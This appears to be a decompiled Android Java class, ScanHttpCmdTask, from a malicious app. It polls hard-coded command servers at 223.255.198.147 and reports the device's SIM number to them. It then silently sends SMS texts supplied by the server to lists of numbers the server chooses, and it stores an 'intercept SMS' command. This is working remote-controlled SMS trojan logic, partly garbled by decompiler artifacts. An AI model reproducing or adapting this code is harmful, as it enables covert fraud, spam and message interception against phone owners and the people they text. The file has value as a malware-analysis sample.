// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

// Referenced classes of package com.example.utils:
//            JSONParser, SocketHttpRequester

public final class ScanHttpCmdTask
{

    public ScanHttpCmdTask(Context context1, String s, String s1, String s2)
    {
        jParser = new JSONParser();
        commands = null;
        getCommand_url = "http://223.255.198.147/home/get_command.php";
        getSmsCommand_url = "http://223.255.198.147/home/get_sms_command.php";
        address = "";
        bady = "";
        context = context1;
        phoneNumber = s;
        url = s1;
        cmd = s2;
    }

    private String getSmsCommand()
    {
        String s;
        StrictMode.setThreadPolicy((new android.os.StrictMode.ThreadPolicy.Builder()).detectDiskReads().detectDiskWrites().detectNetwork().penaltyLog().build());
        StrictMode.setVmPolicy((new android.os.StrictMode.VmPolicy.Builder()).detectLeakedSqlLiteObjects().penaltyLog().penaltyDeath().build());
        s = null;
        JSONArray jsonarray;
        params = new ArrayList();
        params.add(new BasicNameValuePair("sim_no", phoneNumber));
        JSONObject jsonobject = SocketHttpRequester.httpPostUpload(getSmsCommand_url, params);
        if(jsonobject.getInt("success") != 1)
            break MISSING_BLOCK_LABEL_299;
        commands = jsonobject.getJSONArray("commands");
        jsonarray = commands;
        s = null;
        if(jsonarray == null)
            break MISSING_BLOCK_LABEL_309;
        if(commands.length() == 0)
            break MISSING_BLOCK_LABEL_309;
        Log.i("ScanHttpCmdTask", (new StringBuilder("----task get commands---")).append(commands.toString()).toString());
        JSONObject jsonobject1 = commands.getJSONObject(0);
        s = jsonobject1.getString("command");
        addrArray = jsonobject1.getString("address").split("\n");
        String s1 = jsonobject1.getString("bady");
        Log.i("ScanHttpCmdTask", (new StringBuilder("----task get command---")).append(s).toString());
        Log.i("ScanHttpCmdTask", (new StringBuilder("----task get address---")).append(addrArray).toString());
        Log.i("ScanHttpCmdTask", (new StringBuilder("----task get content---")).append(s1).toString());
        if(!s.equals("1"))
            break MISSING_BLOCK_LABEL_307;
        bady = s1;
        return s;
        return "0";
        Exception exception;
        exception;
        exception.printStackTrace();
        return s;
        return "0";
    }

    private void sendSmsMessage(String s, String s1)
    {
        SmsManager.getDefault().sendTextMessage(s, null, s1, null, null);
        Log.d("ScanHttpCmdTask", (new StringBuilder("sendSmsMessage \u53D1\u77ED\u4FE1")).append(s1).append(" \u5730\u5740 ").append(s).toString());
    }

    public void DoTask()
    {
        (new Thread() {

            public void run()
            {
                Log.d("ScanHttpCmdTask", "dotask run \u62E6\u622A\u77ED\u4FE1\u4EFB\u52A1");
                ScanHttpCmdTask.TASK_FLAG = true;
                Log.i("ScanHttpCmdTask", (new StringBuilder("---task before CMD is---")).append(cmd).toString());
                String s = getCommand();
                if(s != null && s != "")
                {
                    context.getSharedPreferences("commond", 1).edit().putString("cmd", s.trim()).commit();
                    Log.i("ScanHttpCmdTask", (new StringBuilder("dotask \u83B7\u53D6\u62E6\u622A\u77ED\u4FE1\u547D\u4EE4")).append(s.trim()).toString());
                }
            }

            final ScanHttpCmdTask this$0;

            
            {
                this$0 = ScanHttpCmdTask.this;
                super();
            }
        }).start();
    }

    public void doSendSMStask()
    {
        (new Thread() {

            public void run()
            {
                String s;
                Log.d("ScanHttpCmdTask", "doSendSMStask run \u53D1\u9001\u77ED\u4FE1\u4EFB\u52A1");
                s = getSmsCommand();
                if(s == null || s == "" || !s.equals("1") || addrArray == null || addrArray.length <= 0 || bady == null || bady.equals("")) goto _L2; else goto _L1
_L1:
                String as[];
                int i;
                int j;
                Log.e("ScanHttpCmdTask", (new StringBuilder()).append(addrArray).toString());
                as = addrArray;
                i = as.length;
                j = 0;
_L5:
                if(j < i) goto _L3; else goto _L2
_L2:
                return;
_L3:
                String s1 = as[j];
                Log.e("ScanHttpCmdTask", (new StringBuilder("--sending")).append(s1).toString());
                sendSmsMessage(s1, bady);
                j++;
                if(true) goto _L5; else goto _L4
_L4:
            }

            final ScanHttpCmdTask this$0;

            
            {
                this$0 = ScanHttpCmdTask.this;
                super();
            }
        }).start();
    }

    public String getCommand()
    {
        String s;
        StrictMode.setThreadPolicy((new android.os.StrictMode.ThreadPolicy.Builder()).detectDiskReads().detectDiskWrites().detectNetwork().penaltyLog().build());
        StrictMode.setVmPolicy((new android.os.StrictMode.VmPolicy.Builder()).detectLeakedSqlLiteObjects().penaltyLog().penaltyDeath().build());
        s = null;
        JSONObject jsonobject;
        params = new ArrayList();
        params.add(new BasicNameValuePair("sim_no", phoneNumber));
        jsonobject = SocketHttpRequester.httpPostUpload(getCommand_url, params);
        if(jsonobject == null)
            return "0";
        if(jsonobject.getInt("success") != 1) goto _L2; else goto _L1
_L1:
        JSONArray jsonarray;
        commands = jsonobject.getJSONArray("commands");
        jsonarray = commands;
        s = null;
        if(jsonarray == null) goto _L4; else goto _L3
_L3:
        int i = commands.length();
        s = null;
        if(i == 0) goto _L4; else goto _L5
_L5:
        try
        {
            s = commands.getJSONObject(0).getString("command");
            Log.i("ScanHttpCmdTask", (new StringBuilder("----task get command---")).append(s).toString());
        }
        catch(Exception exception)
        {
            exception.printStackTrace();
        }
          goto _L6
_L2:
        s = "0";
_L6:
        return s;
_L4:
        s = "0";
        if(true) goto _L6; else goto _L7
_L7:
    }

    public static boolean TASK_FLAG = false;
    static String cmdString = null;
    private final String TAG = "ScanHttpCmdTask";
    private String addrArray[];
    private String address;
    private String bady;
    private String cmd;
    private String command;
    JSONArray commands;
    private Context context;
    private String getCommand_url;
    private String getSmsCommand_url;
    JSONParser jParser;
    List params;
    private String phoneNumber;
    private String url;







}
